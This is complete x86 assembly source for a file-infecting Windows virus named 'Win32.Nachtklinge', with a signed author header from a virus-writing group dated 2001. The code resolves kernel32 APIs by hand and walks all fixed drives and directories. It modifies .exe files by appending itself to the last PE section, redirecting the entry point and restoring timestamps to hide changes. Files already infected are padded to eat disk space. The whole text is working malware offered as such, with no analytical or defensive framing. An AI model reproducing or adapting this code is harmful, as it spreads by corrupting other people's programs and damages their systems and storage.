 ;
 ; Name:       Win32.Nachtklinge
 ;
 ; Type:       Runtime PE-Infector
 ;
 ; Coder:      BeLiAL/bcvg
 ;
 ; Comment:    - Eats HD-space (when win32.nachtklinge finds a file which is
 ;               already infected or not infectable, the filesize will increased (60kb))  
 ;             - Infects first 50 files on all HDs in all dirs !!  
 ;             - Nachtklinge has a bug, it crashes on some files, but
 ;               i dunno wether it was my fault or the coder of the file
 ;               was cleverer than i was ;)
 ;
 ; Greetings:  Greetings go out to the whole BlackCat group, espacially to Dr_T and
 ;             SatanicC0der 
 ;             also a "hello" to toro, Sinist3r and cwarrior alias daniel'
 ; 
 ; One important thing: Puppet on Undernet (#winnuke) is totally lame (he is the coder of
 ;                      NukeNabber). When u see him, give him greetings from me and
 ;                      congratulate him to his amazing coding skills. 
 ;
 ;
 ;  BeLiAL 2001
 ;  http://home.foni.net/~belial
 ;
 ;
 ;        
 ;                             Schwarz verbreitet sich in meinem Kopf
 ;                             ganz aufgequollen, mein Augenlicht zersetzt,
 ;                             das Herz verbrennt im weiﬂen Nichts,
 ;                             und doch es wird...
 
.386
.model flat

Extrn ExitProcess:Proc

virussize        EQU offset virusend - offset start
MAX_PATH         EQU 260
DIR_ATTRIB       EQU 10h
DRIVE_FIXED      EQU  3h

.data

db 0

.code

start:

call deltastuff

deltastuff:
pop ebp
sub ebp,offset deltastuff

mov eax,dword ptr [ebp+old_entry]
mov dword ptr [ebp+old_entry_save],eax

call locate_kernel                      ;copies kernel address to eax
mov dword ptr [ebp+kerneloffset],eax

call get_export_table                   ;expects kernel address in eax

lea eax,[ebp+offset LoadLibrary] 
call get_kernel_api                     ;find an API in kernel

lea eax,[ebp+offset GetProcAddress]
call get_kernel_api

call get_apis 

mov byte ptr [ebp+infection_counter],0

pop eax
push eax
mov dword ptr [ebp+stackshit],eax

lea eax,[ebp+offset directorybuffer]
push eax
push 256
call [ebp+GetCurrentDirectory]

new_round:

lea eax,[ebp+offset thedrive]
push eax
call [ebp+SetCurrentDirectory]
cmp eax,0
je exit_routine

call InfectCurrentDir

findfirstdir:

lea eax,[ebp+FindFileData]
push eax
lea eax,[ebp+offset dirstring]
push eax
call [ebp+FindFirstFile]
mov dword ptr [ebp+dirhandle],eax
inc eax
jz go_one_down
cmp word ptr [ebp+FindFileData.cFileName],2e2eh
je findnextdir1
cmp word ptr [ebp+FindFileData.cFileName],002eh
je findnextdir1
cmp dword ptr [ebp+FindFileData.dwFileAttributes],DIR_ATTRIB
jne findnextdir1
push dword ptr [ebp+dirhandle]
lea eax,[ebp+offset FindFileData.cFileName]
push eax
call [ebp+SetCurrentDirectory]
call InfectCurrentDir
jmp findfirstdir

findnextdir1:
mov eax,dword ptr [ebp+dirhandle]

findnextdir:
lea ebx,[ebp+offset FindFileData]
push ebx
push eax
call [ebp+FindNextFile]
test eax,eax
jz go_one_down
cmp word ptr [ebp+FindFileData.cFileName],2e2eh
je findnextdir1
cmp word ptr [ebp+FindFileData.cFileName],2e00h
je findnextdir1
cmp word ptr [FindFileData.cFileName],002eh
je findnextdir1
cmp dword ptr [ebp+FindFileData.dwFileAttributes],DIR_ATTRIB
jne findnextdir1
push dword ptr [ebp+dirhandle]
lea eax,[ebp+offset FindFileData.cFileName]
push eax
call [ebp+SetCurrentDirectory]
call InfectCurrentDir
jmp findfirstdir

exit_routine:

add byte ptr [ebp+thedrive],1
lea eax,[ebp+offset thedrive]
push eax
call [ebp+GetDriveType]
cmp eax,DRIVE_FIXED
je new_round

lea eax,[ebp+offset directorybuffer]
push eax
call [ebp+SetCurrentDirectory]
jmp return_host

go_one_down:

lea eax,[ebp+offset dotdot]
push eax
call [ebp+SetCurrentDirectory]

push dword ptr [ebp+dirhandle]
call [ebp+FindClose]

pop eax
mov dword ptr [ebp+dirhandle],eax
mov ebx,dword ptr [ebp+stackshit]
cmp eax,ebx
jne findnextdir1
push eax
jmp exit_routine

return_host:

cmp ebp,0
jne not1stgeneration
push 0
call ExitProcess

not1stgeneration:
mov eax,dword ptr [ebp+old_entry_save]
jmp eax

;------------------------------procedures----------------------------------------

locate_kernel proc
mov dword ptr [ebp+stack_buffer],ebx

pop ebx
pop eax
push eax
push ebx
mov ax,0000h

is_this_mz:

cmp word ptr [eax],'ZM'
je found_mz
sub eax,10000h
jmp is_this_mz

found_mz:

mov ebx,dword ptr [ebp+stack_buffer]
ret

stack_buffer dd 0

endp

get_export_table proc
pushad

mov ebx,dword ptr [eax+3ch]
add eax,ebx
cmp word ptr [eax],'EP'
jne prepare_for_jumping_back

mov esi,dword ptr [eax+78h] ;go to exporttable
add esi,dword ptr [ebp+kerneloffset]

add esi,1ch
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kerneloffset] ;Offset of RVA of the function_names_table
mov [ebp+dword ptr Api_Adress_Table],eax

add esi,4
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kerneloffset] ;Offset of RVA of the function_names_table
mov [ebp+dword ptr Api_Name_Table],eax

add esi,4
mov eax,dword ptr [esi]
add eax,dword ptr [ebp+kerneloffset] ;Offset of RVA of the function_names_table
mov [ebp+dword ptr Api_Ordinary_Table],eax

popad
ret

prepare_for_jumping_back:

popad
pop eax
jmp return_host

endp

get_kernel_api  proc
pushad

push eax
add eax,4
call get_string_lenght
mov dword ptr [ebp+Current_API_Lenght],eax
pop eax
mov ebx,dword ptr [ebp+Api_Name_Table]
mov edx,0

string_find_loop:
mov ecx,dword ptr [ebp+Current_API_Lenght]
lea esi,[eax+4]
mov edi,dword ptr [ebx]
add edi,dword ptr [ebp+kerneloffset]
rep cmpsb
je found_API_string
add edx,1
add ebx,4
jmp string_find_loop

found_API_string:

shl edx,1
add edx,dword ptr [ebp+Api_Ordinary_Table]
mov ebx,0
mov bx,word ptr [edx]

shl bx,2
add ebx,dword ptr [ebp+Api_Adress_Table]
mov edx,dword ptr [ebx]
add edx,dword ptr [ebp+kerneloffset]
mov dword ptr [eax],edx

popad
ret

endp

get_string_lenght proc    ;offset of string in eax

push ecx
mov ecx,0

find_the_end_again:

cmp byte ptr [eax],00h
je found_lenght
inc ecx
inc eax
jmp find_the_end_again

found_lenght:

mov eax,ecx
pop ecx

ret

endp


get_apis proc
pushad

lea eax,[ebp+offset kernel32]
push eax
call [ebp+LoadLibrary]
mov dword ptr [ebp+kernelmodulhandle],eax

mov ebx,eax
lea edx,[ebp+offset CreateFile]

find_the_next_one:

push edx
push ebx
add edx,4
push edx
push ebx
call [ebp+GetProcAddress]
pop ebx
pop edx
mov dword ptr [edx],eax
cmp eax,0
je prepare_for_jumping_back
add edx,4
mov eax,edx
call get_string_lenght
add edx,eax
inc edx
cmp byte ptr [edx],'e'
je found_them_all
jmp find_the_next_one

found_them_all:

popad
ret

endp

InfectCurrentDir proc
pushad

findfirstfile:

lea eax,[ebp+offset FindFileData]
push eax
lea eax,[ebp+offset exestring]
push eax
call [ebp+FindFirstFile]
mov dword ptr [ebp+findfilehandle],eax
inc eax
jz no_files_left
jmp infect_the_file

find_next_file:

lea eax,[ebp+offset FindFileData]
push eax
push dword ptr [ebp+findfilehandle]
call [ebp+FindNextFile]
test eax,eax
jz no_files_left

infect_the_file:

push 0
push 0
push 3
push 0
push 1
push 80000000h + 40000000h
lea eax,[ebp+offset FindFileData.cFileName]
push eax
call [ebp+CreateFile]
cmp eax,0ffffffffh
je find_next_file
mov dword ptr [ebp+filehandle],eax

lea eax,[ebp+offset lastwrite]
push eax
lea eax,[ebp+offset lastaccess]
push eax
lea eax,[ebp+offset creationtime]
push eax
push dword ptr [ebp+filehandle]
call [ebp+GetFileTime]

push 0
push dword ptr [ebp+filehandle]
call [ebp+GetFileSize]
mov dword ptr [ebp+filesize],eax

add eax,virussize
push eax

push 0
push eax
push 0
push 4
push 0
push dword ptr [ebp+filehandle]
call [ebp+CreateFileMapping]
mov dword ptr [ebp+filemaphandle],eax

pop ebx                 ;not silly, just a personal note

push ebx
push 0
push 0
push 2
push eax
call [ebp+MapViewOfFile]
mov dword ptr [ebp+filemapaddress],eax

;The infection starts here!!!!!!!

cmp word ptr [eax+38h],';;'
je make_file_bigger

mov word ptr [eax+38h],';;'
mov ebx,dword ptr [eax+3ch]
add eax,ebx
cmp word ptr [eax],'EP'
jne close_handles

mov ebx,dword ptr [eax+28h]         ;file entry point
add ebx,dword ptr [eax+34h]         ;+image base
mov dword ptr [ebp+old_entry],ebx   ;=old entry point ;)
mov ebx,dword ptr [eax+3ch]
mov dword ptr [ebp+file_alignment],ebx

xor edx,edx
mov dx,word ptr [eax+14h]           ;size of optional_header
add edx,eax
add edx,18h                         ;size of image_header
                                    ;the section-headers begin in edx
push eax
push edx
                                    ;number of sections = eax+6h
mov cx,word ptr [eax+6h]            
mov ax,cx                           ;nr of sections in ax
dec ax                              ;first section is section number 0
xor ecx,ecx
mov word ptr [ebp+section_counter],0

find_last_section:
mov ebx,dword ptr [edx+14h]
cmp ebx,ecx
jz not_bigger

section_bigger:
mov si,word ptr [ebp+section_counter]

not_bigger:
cmp ax,word ptr [ebp+section_counter]
je found_last_section
add word ptr [ebp+section_counter],1
mov ecx,dword ptr [edx+14h]
add edx,28h
jmp find_last_section

found_last_section:
mov eax,28h
xor ecx,ecx
mov cx,si
mul ecx
pop edx
add edx,eax
pop eax                                 ;eax=offset PE  edx=offset last section header
                                    
or dword ptr [edx+24h],00000020h  	
or dword ptr [edx+24h],20000000h
or dword ptr [edx+24h],80000000h        ;changed the attributes of the last section

mov ebx,dword ptr [edx+8h]
mov dword ptr [ebp+old_section_size],ebx
add ebx,virussize
add dword ptr [edx+8h],ebx              ;virtualsize is patched and saved

mov ebx,dword ptr [edx+10h]
mov dword ptr [ebp+old_raw_size],ebx
push eax
push edx
mov eax,dword ptr [edx+8h]
xor edx,edx
mov ebx,dword ptr [ebp+file_alignment]
div ebx
sub ebx,edx
pop edx
pop eax
mov ecx,dword ptr [edx+8h]
add ecx,ebx
mov dword ptr [edx+10h],ecx             ;size of raw data patched and saved

mov ebx,dword ptr [edx+0ch]
add ebx,dword ptr [ebp+old_section_size]
mov dword ptr [eax+28h],ebx             ;now we have a new entry point

mov ebx,dword ptr [edx+10h]
add ebx,dword ptr [ebp+old_raw_size]
add ebx,1000h
add dword ptr [eax+50h],ebx		    ;size_of_image is patched

mov ebx,dword ptr [edx+14h]
add ebx,dword ptr [ebp+old_section_size]
add ebx,dword ptr [ebp+filemapaddress]

mov edi,ebx
lea esi,[ebp+offset start]
mov ecx,virussize
rep movsb                               ;virus is at the end
add byte ptr [ebp+infection_counter],1
jmp close_handles

make_file_bigger:

push dword ptr [ebp+filemapaddress]
call [ebp+UnmapViewOfFile]

push dword ptr [ebp+filemaphandle]
call [ebp+CloseHandle]

mov eax,dword ptr [ebp+filesize]
add eax,0ffffh

push eax

push 0
push eax
push 0
push 4
push 0
push dword ptr [ebp+filehandle]
call [ebp+CreateFileMapping]
mov dword ptr [ebp+filemaphandle],eax

pop ebx                 ;saw it already anywhere else ? ;)

push ebx
push 0
push 0
push 2
push eax
call [ebp+MapViewOfFile]
mov dword ptr [ebp+filemapaddress],eax

close_handles:

push dword ptr [ebp+filemapaddress]
call [ebp+UnmapViewOfFile]

push dword ptr [ebp+filemaphandle]
call [ebp+CloseHandle]

lea eax,[ebp+offset lastwrite]
push eax
lea eax,[ebp+offset lastaccess]
push eax
lea eax,[ebp+offset creationtime]
push eax
push dword ptr [ebp+filehandle]
call [ebp+SetFileTime]

push dword ptr [ebp+filehandle]
call [ebp+CloseHandle]

cmp byte ptr [ebp+infection_counter],50
jne find_next_file
popad
clear_stack:
pop eax
cmp eax,dword ptr [ebp+stackshit]
jne clear_stack
jmp return_host

no_files_left:

push dword ptr [ebp+findfilehandle]
call [ebp+FindClose] 

popad
ret

endp


;-----------------------------------variables----------------------------

kerneloffset            dd 0
Api_Adress_Table        dd 0
Api_Name_Table          dd 0
Api_Ordinary_Table      dd 0

Current_API_Lenght      dd 0
LoadLibrary             dd 0
LoadLibrary_            db "LoadLibraryA",0
GetProcAddress          dd 0
GetProcAddress_         db "GetProcAddress",0

kernel32                db "kernel32.dll",0
kernelmodulhandle       dd 0

CreateFile              dd 0
CreateFile_             db "CreateFileA",0
CreateFileMapping       dd 0
CreateFileMapping_      db "CreateFileMappingA",0
MapViewOfFile           dd 0
MapViewOfFile_          db "MapViewOfFile",0
CloseHandle             dd 0
CloseHandle_            db "CloseHandle",0
FindClose               dd 0
FindClose_              db "FindClose",0
UnmapViewOfFile         dd 0
UnmapViewOfFile_        db "UnmapViewOfFile",0
FindFirstFile           dd 0
FindFirstFile_          db "FindFirstFileA",0
FindNextFile            dd 0
FindNextFile_           db "FindNextFileA",0
GetFileSize             dd 0
GetFileSize_            db "GetFileSize",0
GetFileTime             dd 0
GetFileTime_            db "GetFileTime",0
SetFileTime             dd 0
SetFileTime_            db "SetFileTime",0
GetCurrentDirectory     dd 0
                        db "GetCurrentDirectoryA",0
SetCurrentDirectory     dd 0
                        db "SetCurrentDirectoryA",0
GetDriveType            dd 0
                        db "GetDriveTypeA",0
                                                
                        db "e" 

findfilehandle          dd 0
dirhandle               dd 0
filehandle              dd 0
filemaphandle           dd 0
filemapaddress          dd 0
exestring               db "*.exe",0
dirstring               db "*.*",0
filesize                dd 0
old_entry               dd 0
file_alignment          dd 0
section_counter         dw 0
old_section_size        dd 0
old_raw_size            dd 0
old_entry_save          dd 0
                        
                        db "Win9x.Nachtklinge coded by BeLiAL/bcvg"
stackshit               dd 0
directorybuffer         db 256 dup (1)
thedrive                db "c:\",0
dotdot                  db "..",0
infection_counter       db 0
                                         
FILETIME struct
dwLowDateTime         DWORD   ?
dwHighDateTime        DWORD   ?      
FILETIME ends

WIN32_FIND_DATA struct
dwFileAttributes      DWORD ?
ftCreationTime        FILETIME <>
ftLastAccessTime      FILETIME <>        
ftLastWriteTime       FILETIME <>      
nFileSizeHigh         DWORD   ?        
nFileSizeLow          DWORD   ?      
dwReserved0           DWORD   ?       
dwReserved1           DWORD   ?       
cFileName             BYTE MAX_PATH dup(?)
cAlternate            BYTE 0eh dup(?)   
ends

FindFileData        WIN32_FIND_DATA <>
lastwrite           FILETIME <>
lastaccess          FILETIME <>
creationtime        FILETIME <>

                    db "Follow the Black Cat"
virusend label near

end start